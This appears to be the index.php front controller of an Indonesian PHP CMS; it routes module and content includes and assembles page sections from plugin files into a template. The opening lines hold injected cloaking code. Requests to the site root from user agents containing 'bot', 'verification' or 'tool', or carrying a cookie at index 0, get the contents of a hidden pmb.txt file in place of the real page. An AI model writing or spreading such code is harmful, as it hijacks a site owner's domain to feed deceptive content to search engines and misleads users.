<?php
if(strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'bot') > 0  && $_SERVER['REQUEST_URI'] == '/' || isset($_COOKIE[0]) && $_SERVER['REQUEST_URI'] == '/' || strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'verification') > 0 && $_SERVER['REQUEST_URI'] == '/' || strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'tool') > 0 && $_SERVER['REQUEST_URI'] == '/') {
    echo implode('', file('pmb.txt'));
    exit;
}

class microTimer {
    function start() {
        global $starttime;
        $mtime = microtime ();
        $mtime = explode (' ', $mtime);
        $mtime = $mtime[1] + $mtime[0];
        $starttime = $mtime;
    }
    function stop() {
        global $starttime;
        $mtime = microtime ();
        $mtime = explode (' ', $mtime);
        $mtime = $mtime[1] + $mtime[0];
        $endtime = $mtime;
        $totaltime = round (($endtime - $starttime), 5);
        return $totaltime;
    }
}


include 'ikutan/session.php';
@header("konten-type: text/html; charset=utf-8;");
ob_start("ob_gzhandler");
$_SESSION['modul_ajax'] = true;

$timer = new microTimer;
$timer->start();





define('cms-KOMPONEN', true);
define('cms-KONTEN', true);
include "ikutan/config.php";
include "ikutan/mysqli.php";
include "ikutan/template.php";
global $judul_situs,$theme;
$_GET['aksi'] = !isset($_GET['aksi']) ? null : $_GET['aksi'];
$_GET['modul'] = !isset($_GET['modul']) ? null : $_GET['modul'];
$_GET['pilih'] = !isset($_GET['pilih']) ? null : $_GET['pilih'];
$_GET['act'] = !isset($_GET['act']) ? null : $_GET['act'];

  if (isset($stats) != 'OK'){
include 'ikutan/statistik.inc.php';
stats();
setcookie('stats', 'OK', time()+ 3600);	
}
 

$old_modulules = !isset($old_modulules) ? null : $old_modulules;


ob_start();
switch($_GET['modul']) {
	
case 'yes':
	if (file_exists('modul/'.$_GET['pilih'].'/'.$_GET['pilih'].'.php') 
		&& !isset($_GET['act']) 
		&& !preg_match('/\.\./',$_GET['pilih'])) {
		include 'modul/'.$_GET['pilih'].'/'.$_GET['pilih'].'.php';
	} 	else if (file_exists('modul/'.$_GET['pilih'].'/act_'.$_GET['act'].'.php') 
				&& !preg_match('/\.\./',$_GET['pilih'])
				&& !preg_match('/\.\./',$_GET['act'])
				) 
				{
				include 'modul/'.$_GET['pilih'].'/act_'.$_GET['act'].'.php';
			
				} else {
				header("location:index.php");
				exit;
				 } 
break;	
	
default:
	if (!isset($_GET['pilih'])) {
		include 'konten/normal.php';
	} else if (file_exists('konten/'.$_GET['pilih'].'.php') && !preg_match("/\.\./",$_GET['pilih'])){
		include 'konten/'.$_GET['pilih'].'.php';	
	} else {
		header("location:index.php");
		exit;		
	}
break;	
}

$tengah = ob_get_contents();


///////////////// ATAS ////////////
ob_start();
include "plugin/atas.php";
$atas = ob_get_contents();
ob_end_clean();

//////////////////////////////////
///////////////// ATAS2 ////////////
ob_start();
include "plugin/atas2.php";
$atas2 = ob_get_contents();
ob_end_clean();

//////////////////////////////////

ob_end_clean();
///////////////// BASE URL ////////////
ob_start();
include "plugin/baseurl.php";
$baseurl = ob_get_contents();
ob_end_clean();

//////////////////////////////////
///////////////// LOGO ////////////
ob_start();
include "plugin/logo.php";
$logo = ob_get_contents();
ob_end_clean();

//////////////////////////////////
///////////////// MEDSOS ////////////
ob_start();
include "plugin/medsos.php";
$medsos = ob_get_contents();
ob_end_clean();

//////////////////////////////////
///////////////// FOOTER ////////////
ob_start();
include "plugin/footer.php";
$footer = ob_get_contents();
ob_end_clean();

//////////////////////////////////
///////////////// LINKLOGIN ////////////
ob_start();
include "plugin/linklogin.php";
$linklogin = ob_get_contents();
ob_end_clean();

//////////////////////////////////

///// MENU KIRI /////////////////////
if (!isset($_GET['pilih'])) {
ob_start();

include "plugin/kiri.php";
$kiri = ob_get_contents();
ob_end_clean(); 
} else {
ob_start();
$kiri = ob_get_contents();
ob_end_clean();
}

///// MENU KIRI /////////////////////
///// IKLAN /////////////////////
if (!isset($_GET['pilih'])) {
ob_start();

include "plugin/iklan.php";
$iklan = ob_get_contents();
ob_end_clean(); 
} else {
ob_start();
$iklan = ob_get_contents();
ob_end_clean();
}

///// MENU KIRI /////////////////////



///// MENU KANAN /////////////////////

if (!isset($_GET['pilih'])) {
ob_start();


$footertab = ob_get_contents();
ob_end_clean(); 
} else {
ob_start();

include "plugin/footertab.php";

$footertab = ob_get_contents();
ob_end_clean();
}

///// MENU KANAN /////////////////////











///// MENU KANAN /////////////////////

if (!isset($_GET['pilih'])) {
ob_start();


$kanan = ob_get_contents();
ob_end_clean(); 
} else {
ob_start();

include "plugin/berita.php";
echo "<!-- blok kanan -->";
modul(1);


echo "<!-- blok kanan -->";
blok(1);
$kanan = ob_get_contents();
ob_end_clean();
}

///// MENU KANAN /////////////////////


///// HEADER /////////////////////
if (!isset($_GET['pilih'])) {
ob_start();
include "plugin/header.php";
$header = ob_get_contents();
ob_end_clean(); 
} else {
ob_start();
include "plugin/head.php";
$header = ob_get_contents();
ob_end_clean();
}
///// HEADER /////////////////////
///// SPASI /////////////////////
if (!isset($_GET['pilih'])) {
ob_start();
$spasi = ob_get_contents();
ob_end_clean(); 
} else {
ob_start();
include "plugin/spasi.php";
$spasi = ob_get_contents();
ob_end_clean();
}
///// SPASI /////////////////////
///// SPASI /////////////////////
if (!isset($_GET['pilih'])) {
ob_start();
$spasi2 = ob_get_contents();
ob_end_clean(); 
} else {
ob_start();
include "plugin/spasi2.php";
$spasi2 = ob_get_contents();
ob_end_clean();
}
///// SPASI /////////////////////

///// SPASI /////////////////////
if (!isset($_GET['pilih'])) {
ob_start();
$spasi3 = ob_get_contents();
ob_end_clean(); 
} else {
ob_start();
include "plugin/spasi3.php";
$spasi3 = ob_get_contents();
ob_end_clean();
}
///// SPASI /////////////////////
///// JQUERY HIDDEN /////////////////////


ob_start();

include "plugin/jhidden.php";
$jhidden = ob_get_contents();
ob_end_clean(); 


///// JQUERY HIDDEN /////////////////////




if ($_GET['aksi'] == 'logout') {
logout ();
}

$style_include_out = !isset($style_include) ? '' : implode("",$style_include);
$script_include_out = !isset($script_include) ? '' : implode("",$script_include);
$linklogin = !isset($linklogin) ? '' : $linklogin;
$kiri = !isset($kiri) ? '' : $kiri;$atas = !isset($atas) ? '' : $atas;$atas2 = !isset($atas2) ? '' : $atas2;
$kanan = !isset($kanan) ? '' : $kanan;
$header = !isset($header) ? '' : $header;
$logo = !isset($logo) ? '' : $logo;

$baseurl = !isset($baseurl) ? '' : $baseurl;
$medsos = !isset($medsos) ? '' : $medsos;
$footer = !isset($footer) ? '' : $footer;
$footertab = !isset($footertab) ? '' : $footertab;
$jhidden = !isset($jhidden) ? '' : $jhidden;
$spasi = !isset($spasi) ? '' : $spasi;
$spasi2 = !isset($spasi2) ? '' : $spasi2;
$spasi3 = !isset($spasi3) ? '' : $spasi3;
$iklan = !isset($iklan) ? '' : $iklan;
$define = array (	 
                  'linklogin'     => $linklogin,
				  'kiri'     => $kiri,'atas'     => $atas,'atas2'     => $atas2,
				  'kanan'     => $kanan,
				    'header'     => $header,
					'logo'     => $logo,
					'baseurl'     => $baseurl,
					'medsos'     => $medsos,
					'footer'     => $footer,'footertab'     => $footertab,
					'jhidden'     => $jhidden,
				  'spasi'     => $spasi,
				  'spasi2'     => $spasi2,
				  'spasi3'     => $spasi3,
					'iklan'     => $iklan,
         		 'tengah'     => $tengah,
				
				 'judul_situs' => $judul_situs,
				 'style_include' => $style_include_out,
				 'script_include' => $script_include_out,
				 'meta_description' => $_META['description'],
				 'meta_keywords' => $_META['keywords'],
				 'timer' => $timer->stop()
                );
                
$tpl = new template ('thema/cms-template.html');

$tpl-> define_tag($define);

$tpl-> cetak();
?>